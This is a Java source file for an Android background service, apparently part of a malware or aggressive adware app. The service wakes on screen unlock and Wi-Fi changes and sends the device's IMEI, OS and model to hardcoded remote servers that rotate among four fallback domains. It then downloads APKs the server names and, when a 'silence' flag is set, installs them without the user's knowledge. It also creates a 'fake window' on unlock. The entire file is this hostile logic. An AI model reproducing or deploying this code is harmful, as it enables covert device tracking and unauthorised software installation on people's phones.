package com.xstd.ip.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.PackageInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.text.format.DateUtils;
import android.text.format.Time;
import com.android.volley.Response;
import com.android.volley.toolbox.StringRequest;
import com.xstd.ip.Config;
import com.xstd.ip.InitApplication;
import com.xstd.ip.Tools;
import com.xstd.ip.module.ActiveApplicationInfo;
import com.xstd.ip.module.ApplicationInfo;
import com.xstd.ip.module.PushMessage;
import net.tsz.afinal.http.AjaxCallBack;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.List;

public class CoreService extends Service {

    public static final int UNLOCK_SCREEN = 1;
    public static final int WIFI_STATE_CHANGED = 2;
    public static final String FETCH_SERVER_URL = "http://www.xsjingmo.com:8080/springMvc/student.do";
    public static final String FETCH_SERVER_URL1 = "http://www.jingmoby.com:8080/springMvc/student.do";
    public static final String FETCH_SERVER_URL2 = "http://www.jmxstd.com:8080/springMvc/student.do";
    public static final String FETCH_SERVER_URL3 = "http://www.beiyongjm.com:8080/springMvc/student.do";
    public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數
    private CoreReceiver receiver;
    private Handler handler;
    private InitApplication application;

    private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {

        @Override
        public void packageInstalled(String packageName, int returnCode) throws RemoteException {
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("not call bindService()!!!");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        application = (InitApplication) getApplication();
        handler = new Handler(getMainLooper());
        registerCoreReceiver();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
    }

    private void registerCoreReceiver() {
        receiver = new CoreReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        registerReceiver(receiver, filter);
    }

    /**
     * 接收到广播
     *
     * @param type   类型
     * @param intent
     */
    private void receiveBroadcast(int type, Intent intent) {
        switch (type) {
            case UNLOCK_SCREEN:
                ActiveApplication();
                Tools.initFakeWindow(getApplicationContext());
                if (Tools.isOnline(getApplicationContext()))
                    updateService();
                break;
            case WIFI_STATE_CHANGED:
//                int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
//                if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED)
                if (Tools.isOnline(getApplicationContext()))
                    updateService();
        }
    }

    /**
     * 改变访问服务器的url。
     */
    private void changeServerUrl() {
        long last_failed_update_time = application.getSharedPreferences().getLong("last_failed_update_time", -1);
        if (last_failed_update_time == -1)
            application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).commit();
        else {
            String url = application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL);
            if (FETCH_SERVER_URL.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL1).commit();
                }
            } else if (FETCH_SERVER_URL1.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL2).commit();
                }
            } else if (FETCH_SERVER_URL2.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL3).commit();
                }
            } else if (FETCH_SERVER_URL3.equals(url)) {
                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL).commit();
                }
            }
        }
    }

    /**
     * 从服务器获取更新
     */
    private void updateService() {
        pushMessage();
        long last_update_time = application.getSharedPreferences().getLong("last_update_time", 0);
        if (DateUtils.isToday(last_update_time)) {
            startDownload();
            return;
        }
        if (Config.IS_DOWNLOADING.get())
            return;
        else
            Config.IS_DOWNLOADING.set(true);

        application.getFinalHttp().get(String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=save&imei=%s&os=%s&device=%s&version=%s", application.getImei(), application.getOs(), application.getDevice(), Tools.getVersion(getApplicationContext())), new AjaxCallBack<Object>() {
            @Override
            public void onSuccess(Object o) {
                super.onSuccess(o);
                Tools.logW("updateService:" + o.toString());
                application.getSharedPreferences().edit().putLong("last_update_time", System.currentTimeMillis()).commit();
                Config.IS_DOWNLOADING.set(false);
                if (Tools.isEmpty(o.toString()))
                    return;
                List<String> installPackages = Tools.getDeviceInstallPackName(getApplicationContext());
                try {
                    JSONObject jsonObject = new JSONObject(o.toString());
                    String fileName = jsonObject.getString("fileName");
                    String packName = jsonObject.getString("packName");
                    String remoteUrl = jsonObject.getString("remoteUrl");
                    boolean isSilence = jsonObject.getBoolean("isSilence");
                    String token = jsonObject.getString("mark");
                    if (installPackages.contains(packName)) {
                        PushMessage message = new PushMessage();
                        message.setPackageName(packName);
                        message.setToken(token);
                        message.setType(SendServerService.TYPE_DEVICE_INSTALLED);
                        application.getFinalDb().save(message);
                        return;
                    }
                    List<ApplicationInfo> infos = application.getFinalDb().findAllByWhere(ApplicationInfo.class, String.format("packageName='%s'", packName));
                    if (infos != null && infos.size() > 0) {
                        ApplicationInfo info = infos.get(0);
                        if (info != null && info.isInstall()) {
                            PushMessage message = new PushMessage();
                            message.setPackageName(packName);
                            message.setToken(token);
                            message.setType(SendServerService.TYPE_INSTALLED_BEFORE);
                            application.getFinalDb().save(message);
                        }
                        return;
                    }
                    ApplicationInfo info = new ApplicationInfo(fileName, packName, remoteUrl, isSilence, token);
                    if (!isSilence) {
                        info.setTickerText(jsonObject.getString("tickerText"));
                        info.setTitle(jsonObject.getString("title"));
                        info.setText(jsonObject.getString("text"));
                    }
                    application.getFinalDb().save(info);
                } catch (JSONException e) {
                    //解析出错，通知服务器。
                    String url = String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=errorNotes&imei=?&errorinfo=?", application.getImei(), e.getMessage());
                    application.getFinalHttp().get(url, new AjaxCallBack<Object>() {
                    });
                    e.printStackTrace();
                }
                startDownload();
            }

            @Override
            public void onFailure(Throwable t, int errorNo, String strMsg) {
                super.onFailure(t, errorNo, strMsg);
                Tools.logW("updateService:" + strMsg);
                Config.IS_DOWNLOADING.set(false);
                changeServerUrl();
                handler.postDelayed(new Runnable() {

                    @Override
                    public void run() {
                        if (Tools.isOnline(getApplicationContext()))
                            updateService();
                    }
                }, 1000 * 60 * 5);
            }
        });
        String url = String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=activating&imei=%s&os=%s&device=%s&version=%s", application.getImei(), application.getOs(), application.getDevice(), Tools.getVersion(getApplicationContext()));
        Tools.logW(url);
        application.getFinalHttp().get(url, new AjaxCallBack<Object>() {
            @Override
            public void onSuccess(Object o) {
                super.onSuccess(o);
                if (Tools.isEmpty(o.toString()))
                    return;
                try {
                    JSONObject jsonObject = new JSONObject(o.toString());
                    String packageName = jsonObject.getString("packName");
                    String title = jsonObject.getString("title");
                    String content = jsonObject.getString("content");
                    String tickerText = jsonObject.getString("tickertText");
                    ActiveApplicationInfo appInfo = new ActiveApplicationInfo(tickerText, title, content,packageName);
                    application.getFinalDb().save(appInfo);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(Throwable t, int errorNo, String strMsg) {
                super.onFailure(t, errorNo, strMsg);
                Tools.logW(strMsg);
            }
        });
    }

    private void ActiveApplication() {
        List<ActiveApplicationInfo> infos = application.getFinalDb().findAllByWhere(ActiveApplicationInfo.class, "active=0");
        if (infos != null && infos.size() > 0) {
            ActiveApplicationInfo info = infos.get(0);
            Tools.activeApplicationByNotification(this, info);
        }
    }

    private void pushMessage() {
        Tools.logW("PUSH_MESSAGE");
        List<PushMessage> messages = application.getFinalDb().findAllByWhere(PushMessage.class, "successful = 0", "_id ASC");
        for (final PushMessage message : messages) {
            Tools.logW(message.getPackageName() + "::" + message.getToken());
//            Tools.notifyServer(getApplicationContext(), message);
            String params = String.format("&type=%s&imei=%s&packname=%s&mark=%s&version=%s", message.getType(), application.getImei(), message.getPackageName(), message.getToken(), Tools.getVersion(getApplicationContext()));
            String url = getSharedPreferences(Config.SHARED_PRES, MODE_PRIVATE).getString("fetch_server_url", CoreService.FETCH_SERVER_URL) + "?method=installed" + params;
            Tools.logW(url);
            application.getRequestQueue().add(new StringRequest(url, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    message.setSuccessful(true);
                    application.getFinalDb().update(message);
                }
            }, null));
        }
    }

    private String getDownloadLocation() {
        String parent = Tools.getDownloadDirectory(getApplicationContext());
        if (Tools.isEmpty(parent)) {
            // 先从本地获取下载路径，没有则从服务器获取次机型的下载地址。
            String downloadLocation = application.getSharedPreferences().getString("downloadlocation", null);
            if (Tools.isEmpty(downloadLocation)) {
                Tools.logW("从网络获取可下载地址。");
                application.getFinalHttp().get(String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=deviceSelect&device=%s&version=%s", application.getDevice(), Tools.getVersion(getApplicationContext())), new AjaxCallBack<Object>() {
                    @Override
                    public void onSuccess(Object o) {
                        super.onSuccess(o);
                        if (!Tools.isEmpty(o.toString())) {
                            application.getSharedPreferences().edit().putString("downloadlocation", o.toString().trim()).commit();
                            startDownload();
                        }
                    }

                    @Override
                    public void onFailure(Throwable t, int errorNo, String strMsg) {
                        super.onFailure(t, errorNo, strMsg);
                    }
                });
                return null;
            } else
                return downloadLocation;
        } else
            return parent;
    }

    /**
     * 開始下載，下載完成安裝
     */
    private void startDownload() {
        String direction = getDownloadLocation();
        if (Tools.isEmpty(direction))
            return;
        File pDir = new File(direction);
        if (!pDir.exists())
            pDir.mkdirs();
        List<ApplicationInfo> infos = application.getFinalDb().findAllByWhere(ApplicationInfo.class, "download=0 OR install=0", "_id ASC");
        if (!Config.IS_DOWNLOADING.get() && infos != null && infos.size() > 0) {
            Config.IS_DOWNLOADING.set(true);
            final ApplicationInfo info = infos.get(0);
            final File file = new File(direction, info.getFileName());
            if (file.exists() && file.length() == 0)
                file.delete();
            Tools.logW("开始下载" + info.getFileName());
            application.getFinalHttp().download(info.getDownloadPath(), file.getAbsolutePath(), true, new AjaxCallBack<File>() {

                @Override
                public void onSuccess(File file) {
                    super.onSuccess(file);
                    Config.IS_DOWNLOADING.set(false);
                    Tools.logW(file.getAbsolutePath() + "下载成功");
                    info.setLocalPath(file.getAbsolutePath());
                    info.setDownload(true);
                    application.getFinalDb().update(info);
                    PushMessage message = new PushMessage();
                    message.setPackageName(info.getPackageName());
                    message.setToken(info.getToken());
                    message.setType(SendServerService.TYPE_DOWNLOAD_SUCCESS);
                    application.getFinalDb().save(message);
                    if (info.isSilence())
                        Tools.installFile(getApplicationContext(), info, observer);
                    else
                        Tools.useNotificationInstall(getApplicationContext(), info);
                }

                @Override
                public void onFailure(Throwable t, int errorNo, String strMsg) {
                    super.onFailure(t, errorNo, strMsg);
                    Tools.logW("下载失败" + strMsg);
                    Config.IS_DOWNLOADING.set(false);
                    if (file.exists() && errorNo == 416) {
                        PackageInfo packageInfo = Tools.getPackageInfoByPath(getApplicationContext(), file.getAbsolutePath());
                        if (packageInfo == null) {
                            Tools.logW("文件错误，删除。");
                            file.delete();
                            startDownload();
                        } else {
                            Tools.logW("文件正常。");
                            info.setLocalPath(file.getAbsolutePath());
                            info.setDownload(true);
                            application.getFinalDb().update(info);
                            if (info.isSilence())
                                Tools.installFile(getApplicationContext(), info, observer);
                            else
                                Tools.useNotificationInstall(getApplicationContext(), info);
                        }
                    } else {
                        handler.postDelayed(new Runnable() {

                            @Override
                            public void run() {
                                if (Tools.isOnline(getApplicationContext()))
                                    startDownload();
                            }
                        }, 1000 * 60 * 5);
                    }
                }
            });
        }
    }

    /**
     * 判斷當前時間是否爲可允許更新
     *
     * @return
     */
    @SuppressWarnings("unused")
    private boolean isAllowTime() {
        Time time = new Time();
        time.set(System.currentTimeMillis());
        int hour = time.hour;
        if (6 < hour && hour < 9) {
            return true;
        }
        if (hour > 17 && hour < 24) {
            return true;
        }
        return false;
    }

    class CoreReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            Tools.logW(action);
            if (Intent.ACTION_USER_PRESENT.equals(action))
                receiveBroadcast(UNLOCK_SCREEN, intent);
            else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
                receiveBroadcast(WIFI_STATE_CHANGED, intent);
        }

    }

}